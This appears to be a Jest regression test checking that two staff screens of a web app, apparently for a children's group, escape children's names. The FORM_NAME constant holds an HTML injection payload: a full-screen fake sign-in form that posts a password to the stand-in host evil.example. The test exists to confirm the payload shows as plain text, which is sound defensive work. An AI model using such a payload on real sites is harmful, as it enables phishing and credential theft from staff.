/**
 * @jest-environment jsdom
 *
 * Parents write their children's names, and staff screens list them. The
 * page-wide sanitizer keeps forms and inline styles, so a name inserted as
 * markup could lay a fake sign-in form over a leader's screen. Names are now
 * escaped where the screens compose their HTML (and refused by the API when
 * they contain < or >).
 */

jest.mock('../../spa/app.js', () => ({ translate: (key) => key }));
jest.mock('../../spa/utils/DebugUtils.js', () => ({
  debugLog: jest.fn(),
  debugError: jest.fn(),
  debugWarn: jest.fn(),
  debugInfo: jest.fn(),
}));
jest.mock('../../spa/ajax-functions.js', () => ({}));
jest.mock('../../spa/indexedDB.js', () => ({}));
jest.mock('../../spa/utils/PermissionUtils.js', () => ({ canApproveBadges: () => true }));
jest.mock('../../spa/utils/BadgeLabelUtils.js', () => ({ badgeLabel: () => 'Badge' }));
jest.mock('../../spa/utils/DateUtils.js', () => ({ formatDateShort: (value) => value }));

const { ApproveBadges } = require('../../spa/approve_badges.js');
const { TimeSinceRegistration } = require('../../spa/time_since_registration.js');

const FORM_NAME = '<form action="https://evil.example/x" style="position:fixed;inset:0">'
  + '<input name="password" type="password"><button>Reconnexion</button></form>';

describe('child names on staff screens', () => {
  test('badge approval shows a form-shaped name as text', () => {
    const page = new ApproveBadges({});
    page.pendingBadges = [{
      id: 1, first_name: FORM_NAME, last_name: 'Dupont', etoiles: 1,
      objectif: '<b>goal</b>', description: '<i>desc</i>', badge_section: '<u>s</u>', date_obtention: '2026-10-01',
    }];

    document.body.innerHTML = page.renderPendingBadges();

    expect(document.querySelector('form, input[name="password"], b, i, u')).toBeNull();
    expect(document.querySelector('h2').textContent).toBe(`${FORM_NAME} Dupont`);
  });

  test('time since registration, through the real setContent, keeps it as text', () => {
    document.body.innerHTML = '<div id="registration-list"></div>';
    const page = new TimeSinceRegistration({ lang: 'fr' });
    page.participants = [{ id: 1, first_name: FORM_NAME, last_name: 'Dupont', inscription_date: '2026-09-01' }];
    page.sortKey = 'name';
    page.sortDirection = 'asc';

    page.renderList();

    const list = document.getElementById('registration-list');
    expect(list.querySelector('form, input[name="password"]')).toBeNull();
    expect(list.textContent).toContain(FORM_NAME);
  });
});
